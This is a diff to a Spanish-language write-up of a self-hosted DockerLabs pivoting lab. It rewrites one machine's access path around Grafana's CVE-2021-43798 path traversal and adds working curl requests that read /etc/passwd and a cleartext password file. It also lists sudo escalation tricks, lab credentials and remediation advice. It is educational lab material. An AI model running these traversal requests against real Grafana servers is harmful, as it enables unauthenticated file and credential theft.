@@ -46,7 +46,7 @@ Cada máquina vive en su propia subred y hace de **puente** hacia la siguiente. 
 | 2 | `upload`            | —         | 20.20.20.3| 30.30.30.2| —         | —         | Subida arbitraria de PHP  | `sudo env` (GTFOBins)              |
 | 3 | `inclusion`         | —         | —         | 30.30.30.3| 40.40.40.2| —         | LFI + fuerza bruta SSH    | `su seller` → `sudo php`           |
 | 4 | `trust`             | —         | —         | —         | 40.40.40.3| 50.50.50.2| Fuerza bruta SSH (mario)  | `sudo vim` (GTFOBins)              |
-| 5 | `move`              | —         | —         | —         | —         | 50.50.50.3| Credencial en `/tmp`      | script `sudo` escribible + `python3` |
+| 5 | `move`              | —         | —         | —         | —         | 50.50.50.3| LFI no autenticado en Grafana (CVE-2021-43798) | script `sudo` escribible + `python3` |
 
 ---
 
@@ -377,12 +377,34 @@ proxychains4 -f /tmp/pc4.conf curl http://50.50.50.3/    # ✅ máquina final
 
 ### Acceso
 
-Usuario **freddy**. Su contraseña (`t9sH76gpQ82UFeZ3GXZS`, cadena aleatoria — **no crackeable** con diccionario) se recupera durante la enumeración: queda expuesta en un fichero legible por todos, y también hay `vsftpd` con `anonymous_enable=YES`.
+Un `nmap` a través del último proxy revela, además de los puertos habituales, el **3000/tcp de Grafana** — es la única de las 5 máquinas que lo expone:
 
 ```bash
-# .../tmp/pass.txt → t9sH76gpQ82UFeZ3GXZS
+proxychains4 -f /tmp/pc4.conf nmap -p3000 -sVC 50.50.50.3
+# 3000/tcp  http  Grafana httpd 8.3.0
+```
+
+**Grafana 8.3.0 es vulnerable a [CVE-2021-43798](https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p)**: un *path traversal* no autenticado en `/public/plugins/<plugin>/` que permite leer cualquier fichero del sistema con los permisos del proceso de Grafana:
+
+```bash
+proxychains4 -f /tmp/pc4.conf curl --path-as-is \
+  "http://50.50.50.3:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
+# root:x:0:0:root:/root:/bin/bash
+# ...
+# freddy:x:1000:1000::/home/freddy:/bin/bash
+```
+
+Con el mismo LFI leemos directamente la contraseña de **freddy**, que queda expuesta en texto claro en `/tmp/pass.txt` (cadena aleatoria, `t9sH76gpQ82UFeZ3GXZS` — **no crackeable** con diccionario, pero innecesario al poder leerla sin autenticación):
+
+```bash
+proxychains4 -f /tmp/pc4.conf curl --path-as-is \
+  "http://50.50.50.3:3000/public/plugins/alertlist/../../../../../../../../tmp/pass.txt"
+# t9sH76gpQ82UFeZ3GXZS
+
 proxychains4 -f /tmp/pc4.conf ssh freddy@50.50.50.3      # freddy:t9sH76gpQ82UFeZ3GXZS
 ```
+
+> ⚠️ La máquina también corre `vsftpd` con `anonymous_enable=YES`, pero es una **pista falsa**: la raíz anónima del FTP solo expone `/mantenimiento/database.kdbx` (una base KeePass). Su *master password* resulta ser la propia contraseña de freddy, así que abrirla no aporta ninguna vía de acceso nueva — para llegar hasta ahí primero hace falta el LFI de Grafana.
 
 ### Escalada → root
 
@@ -416,7 +438,7 @@ freddy$ sudo /usr/bin/python3 /opt/maintenance.py
 | `inclusion`         | manchi  | `lovely`                 | Fuerza bruta SSH / `yescrypt`             |
 | `inclusion`         | seller  | `qwerty`                 | Fuerza bruta `su` / `yescrypt`            |
 | `trust`             | mario   | `chocolate`              | Fuerza bruta SSH / `yescrypt`             |
-| `move`              | freddy  | `t9sH76gpQ82UFeZ3GXZS`   | Fichero expuesto (`/tmp/pass.txt`, FTP)   |
+| `move`              | freddy  | `t9sH76gpQ82UFeZ3GXZS`   | LFI no autenticado en Grafana 8.3.0 (CVE-2021-43798) sobre `/tmp/pass.txt` |
 
 ---
 
@@ -426,6 +448,7 @@ freddy$ sudo /usr/bin/python3 /opt/maintenance.py
 - `whereismywebshell`: eliminar la webshell; nunca pasar entrada de usuario a `shell_exec`/`system`.
 - `upload`: validar extensión y tipo MIME, renombrar ficheros, almacenar fuera del *webroot* y servir sin permiso de ejecución (`php_admin_flag engine off` en `uploads/`).
 - `inclusion`: no construir rutas con entrada del usuario; usar listas blancas y `basename()`. `file_get_contents` sobre input controlado por el atacante es LFI.
+- `move`: actualizar Grafana a una versión parcheada (≥ 8.3.1 / 8.2.7 / 8.1.8 / 8.0.7) — CVE-2021-43798 permite lectura de fichero arbitraria sin autenticación. No exponer Grafana sin autenticación ni en la misma red que secretos en texto claro.
 
 **Sistema / privilegios**
 - Reglas `sudo` peligrosas: `env`, `php`, `vim`, `python3` sobre un script escribible son escaladas triviales (ver [GTFOBins](https://gtfobins.github.io)). Restringir a binarios/argumentos concretos y no editables por el usuario.
@@ -439,6 +462,6 @@ freddy$ sudo /usr/bin/python3 /opt/maintenance.py
 
 ### 🧰 Arsenal utilizado
 
-`nmap` · `gobuster` / `ffuf` · `curl` · `chisel` (SOCKS inverso) · `proxychains4` (cadenas `strict_chain`) · `hydra` · `john`/`hashcat` · [GTFOBins](https://gtfobins.github.io)
+`nmap` · `gobuster` / `ffuf` · `curl` · `chisel` (SOCKS inverso) · `proxychains4` (cadenas `strict_chain`) · `hydra` · `john`/`hashcat` · CVE-2021-43798 (Grafana LFI) · [GTFOBins](https://gtfobins.github.io)
 
 > ⚠️ *Realizado en un entorno de laboratorio propio y controlado (DockerLabs) con fines educativos.*
